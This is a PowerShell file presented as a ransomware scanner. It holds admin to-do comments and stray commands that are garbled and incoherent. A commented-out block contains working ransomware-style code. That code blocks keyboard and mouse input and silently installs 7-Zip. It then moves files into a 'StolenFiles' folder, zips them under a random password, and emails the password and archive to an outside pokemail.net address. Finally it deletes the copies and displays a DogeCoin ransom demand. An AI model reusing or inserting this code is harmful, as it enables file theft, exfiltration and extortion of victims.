Scan-Ransonware.ps1

#Requires -Version 3.0
#requires -Module ActiveDirectory

<#
Scan-Ransoneare.ps1

.SYNOPSIS
scanning for Ransonware 

.DESCRIPTION

output can be PowerShell, plain text or HTML.
	
WinRM has been updated for remote management.

service type changed to delayed auto start.

WinRM service started.

Created a WinRM listener on https://* to accept WS-Man requests to any IP on this machine.

Change Log
V1.00, 01/04/2018 - Initial version

TO DO

1-Enable / Check Syman tec Antivirus is running
        
2-Update SEP Definitions

3-Ensure the Server has the latest Windows Security Bundle / Patch (Mar 2020)

4-Disable all the Local Admin Account / Domain Admin Acc (not possible on Domain Controllers)

5- Audit Event 4665 / 4663

6-other toughts
#>

Set-ExecutionPolicy Bypass c:\scripts\A.ps1 -RunType $true -Path c:\Scripts
Test-NetConnection exypmospba01-55.99TB -port 5985
Test-NetConnection exypmospba02-66.45TB -port 5985
Start-Process -FilePath "code.exe" -ArgumentList D:\Desktop\file.txt;
Start-Process -FilePath "file2.exe" -ArgumentList "`"file with spaces.txt`"";
Get-Process code | Set-Window -X 0 -Y 0 -Width 1400 -Height 1049;

# 1-Enable / Check Syman tec Antivirus is running

#2-Update SEP Definitions

#3-Ensure the Server has the latest Windows Security Bundle / Patch (Mar 2020)

#4-Disable all the Local Admin Account / Domain Admin Acc (not possible on Domain Controllers)

#5- Audit Event 4665 / 4663
<#

#Temporarily disable user mouse and keyboard input
$code = @"
    [DllImport("user32.dll")]
    public static extern bool BlockInput(bool fBlockIt);
"@

$userInput = Add-Type -MemberDefinition $code -Name UserInput -Namespace UserInput -PassThru
$userInput::BlockInput($true)

#Install 7zip to zip files
$workdir = "c:\installer\"

If (Test-Path -Path $workdir -PathType Container)
{ Write-Host "$workdir already exists" -ForegroundColor Red}
ELSE
{ New-Item -Path $workdir  -ItemType directory }

#Download the installer
$source = "http://www.7-zip.org/a/7z1604-x64.msi"
$destination = "$workdir\7-Zip.msi"


if (Get-Command 'Invoke-Webrequest')
{
     Invoke-WebRequest $source -OutFile $destination
}
else
{
    $WebClient = New-Object System.Net.WebClient
    $webclient.DownloadFile($source, $destination)
}

Invoke-WebRequest $source -OutFile $destination 

#Start the installation
msiexec.exe /i "$workdir\7-Zip.msi" /qb

#Wait a few Seconds for the installation to finish
Start-Sleep -s 10

#Remove the installer
rm -Force $workdir\7*

#Set source and destination of files to copy and store
$Source = "C:\Users\PraneethBabu Marella\Desktop\StealableFiles"
$Destination = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles"

#Copy all files with certain extension and delete them in the source location
$cp = robocopy /mov $Source $Destination *.txt /s

#Generate a random 8 character password
[Reflection.Assembly]::LoadWithPartialName("System.Web")
$randomPassword = [System.Web.Security.Membership]::GeneratePassword(8,2)

#Set source for 7zip exe (usually the same path in most basic computers)
$pathTo64Bit7Zip = "C:\Program Files\7-Zip\7z.exe"

#Zip destination folder with the random password previously generated
$arguments = "a -tzip ""$Destination"" ""$Destination"" -mx9 -p$randomPassword"
$windowStyle = "Normal"
$p = Start-Process $pathTo64Bit7Zip -ArgumentList $arguments -Wait -PassThru -WindowStyle $windowStyle

#Delete the destination folder
$del = Remove-Item $Destination -Force -Recurse

$email = "8ng3vm+bbvhtmmj122ho@pokemail.net"

#Send password for files to your e-mail
$SMTPServer = "smtp.pokemail.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Password $(get-date -f yyyy-MM-dd)"
$Body =  $randomPassword
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Mailer.send($Msg)
$Msg.Dispose()
$Mailer.Dispose()

#Send zip folder to your e-mail
$ZipFolder = "C:\Users\PraneethBabu Marella\Desktop\StolenFiles.zip"
$SMTPServer = "smtp.pokemail.net"
$Mailer = new-object Net.Mail.SMTPclient($SMTPServer)
$From = $email
$To = $email
$Subject = "$Destination Content $(get-date -f yyyy-MM-dd)"
$Body = "Zip Attached"
$Msg = new-object Net.Mail.MailMessage($From,$To,$Subject,$Body)
$Msg.IsBodyHTML = $False
$Attachment = new-object Net.Mail.Attachment($ZipFolder)
$Msg.attachments.add($Attachment)
$Mailer.send($Msg)
$Attachment.Dispose()
$Msg.Dispose()
$Mailer.Dispose()

#Delete the zip file created
$del = Remove-Item $ZipFolder -Force -Recurse

#Disable temporary user keyboard and mouse input block
$userInput::BlockInput($false)

#Display a message demanding money
#Add the required .NET assembly for message display
Add-Type -AssemblyName System.Windows.Forms

#Show the message
$result = [System.Windows.Forms.MessageBox]::Show('We have some of your important files!!! We demand 2500 DogeCoins for their return.', '!-Notice-!', 'Ok', 'Warning')


#>
